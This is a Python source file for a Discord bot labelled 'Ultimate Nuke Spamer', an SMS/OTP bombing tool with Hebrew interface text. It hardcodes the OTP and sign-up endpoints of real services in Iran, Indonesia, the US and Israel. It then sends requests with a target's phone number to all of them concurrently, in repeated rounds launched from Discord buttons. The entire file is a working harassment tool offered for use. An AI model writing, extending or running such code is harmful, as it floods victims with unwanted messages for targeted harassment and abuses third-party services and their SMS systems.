import discord
from discord.ext import commands
import aiohttp
import asyncio
import os
import random

# ==================== CONFIG ====================
TOKEN = os.getenv("BOT_TOKEN")
intents = discord.Intents.default()
intents.message_content = True 

# ==================== THE MASTER API LIST ====================
ALL_APIs = [
    # --- קבוצה 1: APIs מ-GitHub (Snap, Digikala, וכו') ---
    {"name": "Snap", "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", "method": "POST", "json": {"cellphone": "0{{phone_no_zero}}"}, "headers": {"x-app-name": "passenger-pwa"}},
    {"name": "Digikala", "url": "https://api.digikala.com/v1/user/authenticate/", "method": "POST", "json": {"username": "0{{phone_no_zero}}"}},
    {"name": "Tapsi", "url": "https://api.tapsi.cab/api/v2.2/user", "method": "POST", "json": {"credential": {"phoneNumber": "0{{phone_no_zero}}", "role": "PASSENGER"}}},
    {"name": "Divar", "url": "https://api.divar.ir/v5/auth/authenticate", "method": "POST", "json": {"phone": "0{{phone_no_zero}}"}},
    {"name": "Alibaba", "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "method": "POST", "json": {"phoneNumber": "0{{phone_no_zero}}"}},
    {"name": "Torob", "url": "https://api.torob.com/v4/user/phone/send-otp/?phone_number=0{{phone_no_zero}}", "method": "GET"},

    # --- קבוצה 2: APIs מהקובץ הראשון (Matahari, Shopee, Payfazz) ---
    {"name": "Shopee", "url": "https://shopee.co.id/api/v4/otp/send_vcode", "method": "POST", "json": {"phone": "{{phone}}", "force_channel": "true", "operation": 7, "channel": 2, "supported_channels": [1,2,3]}},
    {"name": "Matahari", "url": "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", "method": "POST", "json": {"otp_request": {"mobile_number": "{{phone}}", "mobile_country_code": "+62"}}},
    {"name": "Klikwa", "url": "https://api.klikwa.net/v1/number/sendotp", "method": "POST", "headers": {"Authorization": "Basic QjMzOkZSMzM="}, "json": {"phone": "{{phone}}"}},
    {"name": "Payfazz", "url": "https://api.payfazz.com/v2/phoneVerifications", "method": "POST", "json": {"phone": "0{{phone_no_zero}}"}},

    # --- קבוצה 3: APIs מה-Nuker (Text4Baby, Misen) ---
    {"name": "Text4Baby", "url": "https://text4baby.org/SignUp/SaveSignUpDetails", "method": "POST", "json": {"CustomerType": {"Selected": "false", "Text": "I am pregnant", "Value": "1"}, "EmailId": "gen_email", "MobileNo": "{{phone}}", "RbTermCondition": "true"}},
    {"name": "Misen", "url": "https://api.postscript.io/subscribe/form", "method": "POST", "params": {"shop_id": "4641", "keyword_id": "29981", "phone": "{{phone}}"}},

    # --- קבוצה 4: APIs ישראליים ---
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "json": {"value": "{{phone}}", "type": "phone", "projectId": "1"}},
    {"name": "Mishloha", "url": "https://www.mishloha.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}}
]

active_bombs = {}

# ==================== UTILS ====================
def get_random_email():
    return f"user_{random.randint(10000, 99999)}@gmail.com"

# ==================== ENGINE ====================
async def run_attack(session, api, phone, user_id):
    if active_bombs.get(user_id) is False: return
    
    no_zero = phone[1:] if phone.startswith('0') else phone
    
    def fix_val(obj):
        if isinstance(obj, dict): return {k: fix_val(v) for k, v in obj.items()}
        if isinstance(obj, str): 
            val = obj.replace("{{phone}}", phone).replace("{{phone_no_zero}}", no_zero)
            return get_random_email() if val == "gen_email" else val
        return obj

    url = api["url"].replace("{{phone}}", phone).replace("{{phone_no_zero}}", no_zero)
    payload = fix_val(api.get("json"))
    params = fix_val(api.get("params"))
    data = fix_val(api.get("data"))
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json"
    }
    if api.get("headers"): headers.update(api["headers"])

    try:
        async with session.request(api["method"], url, json=payload, data=data, params=params, headers=headers, timeout=10) as r:
            print(f"[{api['name']}] Status: {r.status}")
    except:
        pass

# ==================== DISCORD INTERFACE ====================
class BomberModal(discord.ui.Modal, title='🔥 Ultimate Nuke Spamer v10'):
    phone = discord.ui.TextInput(label='מספר יעד', placeholder='05XXXXXXXX', min_length=10, max_length=10)
    rounds = discord.ui.TextInput(label='כמות סבבים', default='1')

    async def on_submit(self, interaction: discord.Interaction):
        target = self.phone.value
        user_id = interaction.user.id
        active_bombs[user_id] = True
        
        await interaction.response.send_message(f"💣 הפצצה מקסימלית החלה על {target}! משתמש ב-{len(ALL_APIs)} מקורות.", ephemeral=True)
        
        async with aiohttp.ClientSession() as session:
            for _ in range(int(self.rounds.value)):
                if active_bombs.get(user_id) is False: break
                tasks = [run_attack(session, api, target, user_id) for api in ALL_APIs]
                await asyncio.gather(*tasks)
                await asyncio.sleep(1)
        
        active_bombs.pop(user_id, None)

class ControlView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="🚀 START NUKE", style=discord.ButtonStyle.danger)
    async def start(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(BomberModal())
    @discord.ui.button(label="🛑 STOP", style=discord.ButtonStyle.secondary)
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_bombs[interaction.user.id] = False
        await interaction.response.send_message("ההפצצה נעצרה.", ephemeral=True)

class MyBot(commands.Bot):
    def __init__(self): super().__init__(command_prefix='!', intents=intents)
    async def setup_hook(self): await self.tree.sync()

bot = MyBot()

@bot.tree.command(name="setup")
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="CyberIL Multi-Source Spamer", 
        description=f"המערכת מסונכרנת עם:\n✅ GitHub Repo\n✅ Local Scripts\n✅ Nuker APIs\n\nסה''כ מקורות פעילים: **{len(ALL_APIs)}**", 
        color=0xff0000
    )
    await interaction.response.send_message(embed=embed, view=ControlView())

bot.run(TOKEN)
